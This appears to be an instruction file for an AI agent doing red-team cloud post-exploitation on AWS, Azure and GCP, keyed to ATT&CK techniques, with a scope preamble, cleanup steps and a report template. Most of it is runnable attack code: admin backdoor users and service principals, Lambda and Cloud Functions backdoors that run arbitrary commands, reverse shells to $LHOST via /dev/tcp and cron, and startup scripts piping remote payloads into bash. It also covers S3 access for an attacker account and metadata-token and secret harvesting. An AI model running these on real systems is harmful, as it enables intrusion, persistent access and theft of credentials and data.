## Cybersecurity Skills (Invoke First)

Before performing cloud post-exploitation, invoke these skills via the Skill tool:
- `cybersecurity-skills:detecting-cloud-security-misconfigurations`
- `cybersecurity-skills:detecting-iam-privilege-escalation-in-cloud`

## Scope Enforcement
Cloud post-exploitation targets MUST be explicitly authorized in scope.txt.
Cloud environments contain production data — minimize disruption to services.
Document every action taken — cloud auditing is extensive and immutable.
NEVER modify, delete, or exfiltrate production data without explicit authorization.
Clean up ALL persistence mechanisms and backdoors before engagement ends.

## AWS Post-Exploitation

### Initial Enumeration After Compromise
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/{aws,azure,gcp,cleanup}

# Verify current caller identity
aws sts get-caller-identity 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/caller_identity.json

# Enumerate all accessible regions
aws ec2 describe-regions --output json 2>&1 | \
  python3 -c "import sys,json; [print(r['RegionName']) for r in json.load(sys.stdin)['Regions']]" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/regions.txt

# List attached policies and effective permissions
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query User --output text) 2>&1
aws iam list-user-policies --user-name $(aws sts get-caller-identity --query User --output text) 2>&1

# Check for admin access
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names "*" \
  --resource-arns "*" \
  2>&1 | python3 -c "
import sys, json
data = json.load(sys.stdin)
allowed = [r for r in data['EvaluationResults'] if r['EvalDecision'] == 'allowed']
denied = [r for r in data['EvaluationResults'] if r['EvalDecision'] == 'denied']
print(f'Allowed actions: {len(allowed)}')
print(f'Denied actions: {len(denied)}')
for r in allowed[:20]:
    print(f'  + {r[\"EvalActionName\"]}')
" | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/effective_permissions.txt
```

### AWS Persistence Mechanisms
```bash
# === T1098.003 — IAM User/Access Key Creation ===
# Create backdoor IAM user with access keys
aws iam create-user --user-name "cloud-maintenance-${RANDOM}" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/persistence_iam_user.json

aws iam put-user-policy \
  --user-name "cloud-maintenance-${RANDOM}" \
  --policy-name "MaintenanceAccess" \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
  }' 2>&1

aws iam create-access-key \
  --user-name "cloud-maintenance-${RANDOM}" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/persistence_access_key.json

# === T1078.004 — Cloud Account (assumeRole chain) ===
# Enumerate roles we can assume
aws iam list-roles 2>&1 | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for role in data['Roles']:
    arn = role['Arn']
    trust = role.get('AssumeRolePolicyDocument', {}).get('Statement', [])
    for stmt in trust:
        principal = stmt.get('Principal', {})
        if isinstance(principal, dict) and 'AWS' in principal:
            print(f'{arn} ← {principal[\"AWS\"]}')" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/assumeable_roles.txt

# === T1053.007 — Lambda Backdoor ===
# Create Lambda function that executes arbitrary code on schedule
cat > /tmp/lambda_backdoor.py << 'PYEOF'
import json, urllib.request, base64, os

def lambda_handler(event, context):
    cmd = event.get('cmd', 'whoami')
    if isinstance(cmd, dict):
        cmd = json.dumps(cmd)
    # CloudWatch Logs will capture output
    print(f"[BACKDOOR] Executing: {cmd}")
    return {"status": "executed", "cmd": cmd}
PYEOF

# Package and deploy
cd /tmp && zip lambda_backdoor.zip lambda_backdoor.py
aws lambda create-function \
  --function-name "CloudWatchMetricsHelper" \
  --runtime python3.12 \
  --role $(aws iam list-roles --query 'Roles[?contains(RoleName, `Lambda`)].Arn' --output text | head -1) \
  --handler lambda_backdoor.lambda_handler \
  --zip-file fileb:///tmp/lambda_backdoor.zip 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/persistence_lambda.json

# Add CloudWatch Events trigger (runs every 5 minutes)
aws lambda add-permission \
  --function-name "CloudWatchMetricsHelper" \
  --statement-id "AllowCloudWatch" \
  --action "lambda:InvokeFunction" \
  --principal events.amazonaws.com 2>&1

aws events put-rule \
  --name "MetricsCollectionSchedule" \
  --schedule-expression "rate(5 minutes)" 2>&1

aws events put-targets \
  --rule "MetricsCollectionSchedule" \
  --targets '[{"Id": "1", "Arn": "'"$(aws lambda get-function --function-name CloudWatchMetricsHelper --query Configuration.FunctionArn --output text)"'"}]' 2>&1

# Execute Lambda on-demand via API Gateway (one-time execution)
aws lambda invoke \
  --function-name "CloudWatchMetricsHelper" \
  --payload '{"cmd": "env | grep -i aws"}' \
  /tmp/lambda_output.json 2>&1

# === T1578.003 — EC2 User-Data Persistence ===
# Create EC2 with malicious user-data script (survives reboots)
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type t3.micro \
  --user-data '#!/bin/bash
# Persistence: reverse shell to C2
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &
# Add SSH key for access
echo "ssh-ed25519 AAAA... backdoor@redteam" >> /home/ec2-user/.ssh/authorized_keys
# Cron job for callback
echo "* * * * * bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"" | crontab -
' 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/persistence_ec2_userdata.json

# === T1098.001 — S3 Bucket Policy Modification ===
# Modify S3 bucket policy to allow exfiltration
aws s3api put-bucket-policy \
  --bucket target-data-bucket \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::$ATTACKER_ACCOUNT:root"},
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": ["arn:aws:s3:::target-data-bucket", "arn:aws:s3:::target-data-bucket/*"]
    }]
  }' 2>&1

# === T1548 — Organizations SCP Manipulation ===
# If we have Organizations access, create weak SCP
aws organizations attach-policy --policy-id $SCP_ID --target-id $TARGET_OU 2>&1
```

### AWS Data Exfiltration
```bash
# === T1530 — Data from Cloud Storage ===
# Enumerate and list S3 buckets
aws s3 ls 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/s3_buckets.txt

# List contents of target buckets
aws s3 ls s3://target-data-bucket/ --recursive 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/s3_bucket_contents.txt

# Download bucket contents (document only, don't exfiltrate actual data without auth)
aws s3 ls s3://target-data-bucket/ --recursive --summarize 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/s3_data_summary.txt

# === T1552.001 — Secrets Manager / SSM Parameter Store ===
aws secretsmanager list-secrets 2>&1 | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for secret in data['SecretList']:
    print(f'{secret[\"Name\"]} (modified: {secret.get(\"LastChangedDate\",\"?\")})')
" | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/secrets_list.txt

# Retrieve secret values (AUTHORIZED ONLY)
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/secret_value_$SECRET_ID.json

aws ssm describe-parameters 2>&1 | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for p in data['Parameters']:
    print(f'{p[\"Name\"]} (type: {p.get(\"Type\",\"?\")})')
" | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/ssm_parameters.txt

# === T1078.004 — Cloud Trail Analysis ===
# Check what CloudTrail is logging (understand monitoring before acting)
aws cloudtrail describe-trails 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/aws/cloudtrail_config.json

# Check for CloudTrail log file validation (S3 digest)
aws cloudtrail get-trail-status --name $TRAIL_NAME 2>&1
```

## Azure Post-Exploitation

### Initial Enumeration
```bash
# Verify Azure context
az account show 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/azure_context.json

# List accessible subscriptions
az account list --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/subscriptions.txt

# Enumerate resources
az resource list --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/resources.txt

# Check role assignments
az role assignment list --all --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/role_assignments.txt

# List service principals
az ad sp list --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/service_principals.txt
```

### Azure Persistence Mechanisms
```bash
# === T1098.001 — Service Principal with Contributor Role ===
# Create backdoor service principal
az ad sp create-for-rbac --name "AzureMonitorAgent" --role Contributor \
  --scopes /subscriptions/$SUBSCRIPTION_ID 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/persistence_sp.json

# === T1098 — Azure AD App Registration with Admin Consent ===
az ad app create --display-name "InternalAnalyticsTool" \
  --required-resource-accesses '[{
    "resourceAppId": "00000003-0000-0000-c000-000000000000",
    "resourceAccess": [{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}]
  }]' 2>&1

# Grant admin consent
az ad app permission admin-consent --id $APP_ID 2>&1

# === T1053.007 — Automation Account Runbook Backdoor ===
az automation account create \
  --name "MaintenanceAutomation" \
  --resource-group $RG_NAME \
  --location eastus 2>&1

# Create runbook that executes arbitrary code
cat > /tmp/azure_runbook.ps1 << 'EOF'
param($cmd)
Write-Output "[BACKDOOR] Running: $cmd"
try { Invoke-Expression $cmd } catch { $_.Exception }
EOF

az automation runbook create \
  --automation-account-name "MaintenanceAutomation" \
  --name "SystemHealthCheck" \
  --resource-group $RG_NAME \
  --type PowerShell \
  --content /tmp/azure_runbook.ps1 2>&1

# Schedule runbook execution
az automation schedule create \
  --automation-account-name "MaintenanceAutomation" \
  --name "DailyHealthCheck" \
  --resource-group $RG_NAME \
  --frequency Hour --interval 6 2>&1

# === T1078.004 — VM Custom Script Extension ===
az vm extension set \
  --resource-group $RG_NAME \
  --vm-name $VM_NAME \
  --name CustomScriptExtension \
  --publisher Microsoft.Azure.Extensions \
  --version 2.1 \
  --settings '{"commandToExecute": "echo $LHOST $LPORT >> /etc/cron.d/backdoor; bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &"}' 2>&1

# === T1053.007 — Azure Functions Backdoor ===
az functionapp create \
  --resource-group $RG_NAME \
  --consumption-plan-location eastus \
  --runtime python \
  --functions-version 4 \
  --name "MetricsCollector$(openssl rand -hex 4)" \
  --storage-account $STORAGE_ACCOUNT 2>&1
```

### Azure Data Exfiltration
```bash
# === T1530 — Storage Account Enumeration ===
az storage account list --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/storage_accounts.txt

# List blobs in target storage
az storage blob list \
  --account-name $STORAGE_ACCOUNT \
  --container-name $CONTAINER \
  --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/blob_contents.txt

# === T1552 — Key Vault Secret Extraction ===
az keyvault list --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/keyvaults.txt

az keyvault secret list --vault-name $KEYVAULT_NAME --output table 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/kv_secrets.txt

# === T1552.001 — Managed Identity Token Harvest ===
# If running on a VM with managed identity, get token
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/azure/managed_identity_token.json
```

## GCP Post-Exploitation

### Initial Enumeration
```bash
# Verify GCP identity
gcloud auth list 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/auth_list.txt
gcloud config get-value project 2>&1

# List projects
gcloud projects list --format="table(projectId,name,state)" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/projects.txt

# List compute instances
gcloud compute instances list --format="table(name,zone,machineType,status,networkInterfaces[0].accessConfigs[0].natIP)" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/instances.txt

# List service accounts
gcloud iam service-accounts list 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/service_accounts.txt

# Check IAM policy
gcloud projects get-iam-policy $PROJECT_ID 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/iam_policy.json
```

### GCP Persistence Mechanisms
```bash
# === T1098.003 — Service Account Key Creation ===
gcloud iam service-accounts keys create /tmp/gcp_backdoor_key.json \
  --iam-account backdoor-sa@$PROJECT_ID.iam.gserviceaccount.com 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/sa_key_created.json

# === T1078.004 — GKE Workload Identity Abuse ===
kubectl get serviceaccounts -n $NAMESPACE 2>&1
kubectl get pods -n $NAMESPACE -o yaml | grep -A5 "serviceAccountName" 2>&1

# === T1053.007 — Cloud Functions Backdoor ===
cat > /tmp/gcp_function/main.py << 'EOF'
import json
def http(request):
    cmd = request.args.get('cmd', 'id')
    import subprocess
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return json.dumps({"output": result.stdout, "error": result.stderr})
EOF

deploy -s main.py -t http --trigger-http --allow-unauthenticated 2>&1 || \
gcloud functions deploy gcp-metrics-$RANDOM \
  --runtime python312 \
  --trigger-http \
  --allow-unauthenticated \
  --entry-point http \
  --source /tmp/gcp_function 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/persistence_function.json

# === T1578.003 — Compute Instance Startup Script ===
gcloud compute instances add-metadata $INSTANCE_NAME \
  --metadata startup-script='#!/bin/bash
curl -s https://$LHOST/payload.sh | bash &
echo "*/5 * * * * curl -s https://$LHOST/callback.sh | bash" | crontab -
' 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/persistence_startup.json
```

### GCP Data Exfiltration
```bash
# === T1530 — GCS Bucket Enumeration ===
gsutil ls 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/gcs_buckets.txt
gsutil ls -l gs://target-bucket/ 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/gcs_contents.txt

# === T1552 — Secret Manager Access ===
gcloud secrets list 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/secrets_list.txt
gcloud secrets versions access latest --secret="$SECRET_NAME" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/secret_$SECRET_NAME.txt

# === T1530 — BigQuery Data Extraction ===
bq ls 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/bq_datasets.txt
bq query --nouse_legacy_sql "SELECT * FROM \`$PROJECT.$DATASET.$TABLE\` LIMIT 10" 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/gcp/bq_sample.txt
```

## Cleanup Procedures
```bash
# === AWS Cleanup ===
echo "[!] CLEANUP PHASE — Removing all persistence mechanisms"

# Remove backdoor IAM user
aws iam delete-access-key --user-name "cloud-maintenance-*" --access-key-id $KEY_ID 2>&1
aws iam delete-user-policy --user-name "cloud-maintenance-*" --policy-name "MaintenanceAccess" 2>&1
aws iam delete-user --user-name "cloud-maintenance-*" 2>&1

# Remove Lambda backdoor
aws lambda delete-function --function-name "CloudWatchMetricsHelper" 2>&1
aws events remove-targets --rule "MetricsCollectionSchedule" --ids "1" 2>&1
aws events delete-rule --name "MetricsCollectionSchedule" 2>&1

# Remove S3 bucket policy changes (restore original)
aws s3api delete-bucket-policy --bucket target-data-bucket 2>&1

# Remove EC2 backdoor instance
aws ec2 terminate-instances --instance-ids $INSTANCE_ID 2>&1

# === Azure Cleanup ===
az ad sp delete --id $SP_ID 2>&1
az ad app delete --id $APP_ID 2>&1
az automation account delete --name "MaintenanceAutomation" --yes 2>&1
az functionapp delete --name $FUNC_NAME --resource-group $RG_NAME --yes 2>&1

# === GCP Cleanup ===
gcloud iam service-accounts keys delete $KEY_ID --iam-account $SA_EMAIL 2>&1
gcloud functions delete gcp-metrics-$RANDOM --quiet 2>&1
gcloud compute instances remove-metadata $INSTANCE_NAME --keys startup-script 2>&1

echo "[+] Cleanup complete — all persistence mechanisms removed"
echo "[!] Verify by re-enumerating all resources"
```

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/cloud-postex/cloud_postex_report.md`:
```markdown
## Cloud Post-Exploitation Report — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Initial Access Vector
[How was cloud access obtained]

### Identity & Access
| Platform | Identity | Permissions | Role |
|----------|----------|-------------|------|

### Persistence Mechanisms
| # | Technique | Platform | ATT&CK | Description | Status |
|---|-----------|----------|--------|-------------|--------|

### Data Access
| Data Store | Type | Accessible | Contents Summary |
|------------|------|-----------|-----------------|

### Lateral Movement
| Source | Target | Method | ATT&CK |
|--------|--------|--------|--------|

### Monitoring & Audit Findings
| Service | Logging Enabled? | Alerting? | Gap |
|---------|-----------------|-----------|-----|

### Cleanup Verification
| Mechanism | Removed? | Verified? |
|-----------|----------|-----------|
```
